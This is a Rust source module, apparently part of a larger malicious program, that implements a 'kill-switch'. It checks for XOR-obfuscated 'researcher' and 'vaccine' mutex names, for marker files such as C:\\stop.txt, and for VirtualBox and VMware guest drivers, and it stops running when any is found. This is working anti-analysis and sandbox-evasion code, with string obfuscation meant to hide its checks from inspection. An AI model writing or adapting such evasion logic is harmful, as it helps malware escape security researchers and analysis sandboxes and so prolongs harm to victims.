use crate::recovery::helpers::obfuscation::deobf;
use std::path::Path;
use tracing::{debug, warn};
use windows::core::PCWSTR;
use windows::Win32::System::Threading::{OpenMutexW, MUTEX_ALL_ACCESS};

pub async fn check_killswitch() -> bool {
    if check_mutexes() {
        warn!("kill-switch triggered: researcher mutex detected");
        return true;
    }

    if check_vaccine_files() {
        warn!("kill-switch triggered: vaccine file detected");
        return true;
    }

    false
}

fn check_mutexes() -> bool {
    let mutex_names = [
        // "Global\ExploitGuard_Registry_IP_Bypass"
        deobf(&[
            0x00, 0x23, 0x20, 0x2D, 0x2E, 0x23, 0x13, 0x0A, 0x37, 0x3F, 0x2F, 0x23, 0x20, 0x26,
            0x3B, 0x08, 0x3A, 0x2E, 0x3D, 0x2B, 0x10, 0x1D, 0x2A, 0x28, 0x26, 0x3C, 0x3B, 0x3D,
            0x36, 0x10, 0x06, 0x1F, 0x10, 0x0D, 0x36, 0x3F, 0x2E, 0x2E, 0x3C, 0x3C,
        ]),
        // "Global\__VACCINE_MUTEX__"
        deobf(&[
            0x00, 0x23, 0x20, 0x2D, 0x2E, 0x23, 0x13, 0x1C, 0x1C, 0x19, 0x0E, 0x0C, 0x0C, 0x06,
            0x01, 0x0A, 0x1C, 0x02, 0x1A, 0x1B, 0x0A, 0x17, 0x1C, 0x1C,
        ]),
        // "Global\B99A8231-1254-4712-B981-2241512"
        deobf(&[
            0x00, 0x23, 0x20, 0x2D, 0x2E, 0x23, 0x13, 0x0D, 0x76, 0x76, 0x0E, 0x77, 0x7D, 0x7C,
            0x7E, 0x62, 0x7E, 0x7D, 0x7A, 0x7B, 0x62, 0x7B, 0x78, 0x7E, 0x7D, 0x62, 0x0D, 0x76,
            0x77, 0x7E, 0x62, 0x7D, 0x7D, 0x7B, 0x7E, 0x7A, 0x7E, 0x7D,
        ]),
    ];

    for name in mutex_names {
        let name_w: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
        unsafe {
            let handle = OpenMutexW(MUTEX_ALL_ACCESS, false, PCWSTR(name_w.as_ptr()));
            if let Ok(h) = handle {
                if !h.is_invalid() {
                    let _ = windows::Win32::Foundation::CloseHandle(h);
                    debug!(mutex = %name, "researcher mutex found");
                    return true;
                }
            }
        }
    }

    false
}

fn check_vaccine_files() -> bool {
    let files = [
        "C:\\analysis",
        "C:\\stop.txt",
        "C:\\vaccine.txt",
        "C:\\windows\\system32\\drivers\\vmmouse.sys",
        "C:\\windows\\system32\\drivers\\vboxguest.sys",
    ];

    for file in files {
        if Path::new(file).exists() {
            debug!(file = %file, "vaccine file found");
            return true;
        }
    }

    false
}
